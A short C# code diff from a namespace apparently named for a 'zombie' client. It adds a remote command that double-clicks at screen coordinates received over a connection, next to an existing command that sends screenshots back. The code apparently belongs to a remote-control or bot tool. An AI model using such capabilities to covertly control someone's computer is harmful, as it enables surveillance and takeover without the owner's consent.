@@ -28,6 +28,10 @@ namespace Zombie.Functions
                 case CommandFlags.Screenshot:
                     Client.Send(Screenshot.Take());
                     break;
+                case CommandFlags.Click:
+                    MousePoint mp = MouseOperations.ConvertScreenPointToCurrent(reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32());
+                    MouseOperations.DoubleLeftClickOnPoint(mp.X, mp.Y);
+                    break;
 
             }
         }
